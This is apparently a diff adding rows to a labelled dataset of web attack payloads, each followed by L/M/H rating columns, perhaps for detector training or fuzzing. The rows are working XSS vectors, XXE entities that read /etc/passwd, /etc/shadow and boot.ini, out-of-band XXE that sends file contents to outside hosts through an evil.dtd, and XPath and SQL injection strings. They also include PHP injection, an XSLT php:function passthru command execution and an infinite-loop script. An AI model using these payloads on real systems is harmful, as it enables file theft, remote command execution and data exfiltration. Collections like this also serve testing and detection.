+<stylesheet xmlns="http://www.w3.org/tr/wd-xsl">	M	L	L	L	M	L	L	M	
+<template match="/">	M	L	L	L	L	L	L	L	
+<eval>new activexobject(&apos;htmlfile&apos;).parentwindow.alert(135)</eval>	M	L	M	L	M	L	L	M	
+<if expr="new activexobject('htmlfile').parentwindow.alert(2)"></if>	H	L	M	L	M	L	L	M	
+</stylesheet>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="136"><form action="" method="post">	L	L	M	L	L	L	M	M	
+<input name="username" value="admin" />	H	L	L	L	L	L	M	M	
+<input name="password" type="password" value="secret" />	L	L	M	L	L	L	M	M	
+<input name="injected" value="injected" dirname="password" />	L	L	M	L	L	L	M	M	
+<input type="submit">	M	L	L	L	L	L	L	M	
+</form>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="137"><svg>	M	L	L	L	L	L	L	L	
+<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">	H	L	M	L	M	L	L	M	
+<circle r="400"></circle>	M	L	L	L	L	L	L	M	
+<animate attributename="xlink:href" begin="0" from="javascript:alert(137)" to="&" />	L	L	M	L	M	M	M	M	
+</a>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
+<div id="138"><link rel="import" href="test.svg" />//["'`-->]]>]</div><div id="139"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />//["'`-->]]>]</div>undefined	L	L	M	L	H	M	M	H	
+<!entity % xxe system "php://filter/convert.base64-encode/resource=/etc/passwd" >	M	L	L	L	M	L	M	M	
+<?xml version="1.0" encoding="iso-8859-1"?>	H	L	L	L	M	M	L	M	
+<!doctype xxe [<!entity foo "aaaaaa">]>	M	L	L	L	M	L	M	M	
+<!doctype xxe [<!entity foo "aaaaaa">]><root>&foo;</root>	H	L	L	L	M	L	M	M	
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype xxe [<!entity foo "aaaaaa">]>	L	L	L	L	M	M	M	M	
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype xxe [<!entity foo "aaaaaa">]><root>&foo;</root>	L	L	L	L	M	M	M	M	
+<?xml version="1.0" encoding="iso-8859-1"?><test></test>	L	L	L	L	M	M	L	M	
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/passwd" >]><foo>&xxe;</foo>	L	L	L	L	M	M	M	H	
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/passwd" >]>	L	L	L	L	M	M	M	H	
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/issue" >]><foo>&xxe;</foo>	L	L	L	L	M	M	M	H	
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/issue" >]>	L	L	L	L	M	M	M	H	
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/shadow" >]><foo>&xxe;</foo>	L	L	L	L	M	M	M	H	
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/shadow" >]>	L	L	L	L	M	M	M	H	
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///c:/boot.ini" >]><foo>&xxe;</foo>	L	L	L	L	M	M	M	H	
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///c:/boot.ini" >]>	L	L	L	L	M	M	M	H	
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "http://example.com:80" >]><foo>&xxe;</foo>	L	L	L	L	M	M	M	H	
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "http://example:443" >]>	L	L	L	L	M	M	M	H	
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any><!entity xxe system "file:////dev/random">]><foo>&xxe;</foo>	L	L	L	L	M	M	M	H	
+<test></test>	M	L	L	L	L	L	L	L	
+<![cdata[<test></test>]]>	M	L	L	L	M	L	L	M	
+x' or name()='username' or 'x'='y	H	M	L	L	M	L	M	M	
+<name>','')); phpinfo(); exit;/*</name>	M	L	L	L	M	L	L	M	
+<![cdata[<script>var n=0;while(true){n++;}</script>]]>	M	L	L	L	M	L	L	M	
+<![cdata[<]]>script<![cdata[>]]>alert('xss');<![cdata[<]]>/script<![cdata[>]]>	L	L	L	L	H	L	L	M	
+<?xml version="1.0" encoding="iso-8859-1"?><foo><![cdata[<]]>script<![cdata[>]]>alert('xss');<![cdata[<]]>/script<![cdata[>]]></foo>	L	L	L	L	H	M	L	H	
+<foo><![cdata[<]]>script<![cdata[>]]>alert('xss');<![cdata[<]]>/script<![cdata[>]]></foo>	L	L	L	L	H	L	L	M	
+<?xml version="1.0" encoding="iso-8859-1"?><foo><![cdata[' or 1=1 or ''=']]></foo>	L	M	L	L	M	M	M	M	
+<foo><![cdata[' or 1=1 or ''=']]></foo>	L	M	L	L	M	M	M	M	
+<xml id=i><x><c><![cdata[<img src="javas]]><![cdata[cript:alert('xss');">]]>	L	L	M	L	M	L	L	M	
+<xml id="xss"><i><b>&lt;img src="javas<!-- -->cript:alert('xss')"&gt;</b></i></xml><span datasrc="#xss" datafld="b" dataformatas="html"></span></c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>	L	L	M	L	M	M	M	L	
+<xml src="xsstest.xml" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>	L	L	M	L	M	L	M	M	
+<span datasrc=#i datafld=c dataformatas=html></span>	H	L	M	L	L	L	M	M	
+<xml src="xsstest.xml" id=i></xml>	H	L	L	L	L	L	L	M	
+<html xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>xss</xss:xss></html>	L	L	M	L	M	L	M	M	
+<html xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">	H	L	L	L	M	L	M	M	
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><script>alert(123)</script></xsl:template></xsl:stylesheet>	L	L	M	L	H	M	M	H	
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:copy-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>	L	L	M	L	H	M	M	L	
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function('passthru','ls -la')"/></xsl:template></xsl:stylesheet>	L	L	M	L	H	M	M	L	
+<!doctype foo [<!element foo any ><!entity xxe system "file:///etc/passwd" >]>	H	L	L	L	M	L	M	M	
+<!doctype foo [<!element foo any ><!entity xxe system "file:///etc/shadow" >]>	H	L	L	L	M	L	M	M	
+<!doctype foo [<!element foo any ><!entity xxe system "file:///c:/boot.ini" >]>	H	L	L	L	M	M	M	M	
+<!doctype foo [<!element foo any ><!entity xxe system "http://example.com/text.txt" >]>	H	L	L	L	M	L	M	M	
+<!doctype foo [<!element foo any><!entity xxe system "file:////dev/random">]>	H	L	L	L	M	L	M	M	
+<!entity % int "<!entity &#37; trick system 'http://127.0.0.1:80/?%file;'>  "> %int;	L	L	L	L	M	M	M	M	
+<!entity % param3 "<!entity &#x25; exfil system 'ftp://127.0.0.1:21/%data3;'>">	L	L	L	L	M	M	M	M	
+<!doctype xxe [ <!entity % file system "file:///etc/issue"><!entity % dtd system "http://example.com/evil.dtd">%dtd;%trick;]>	L	L	L	L	M	L	M	H	
+<!doctype xxe [ <!entity % file system "file:///c:/boot.ini"><!entity % dtd system "http://example.com/evil.dtd">%dtd;%trick;]>	L	L	L	L	M	L	M	H	
+<soap:body><foo><![cdata[<!doctype doc [<!entity % dtd system "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:body>	L	L	M	L	H	L	M	M	
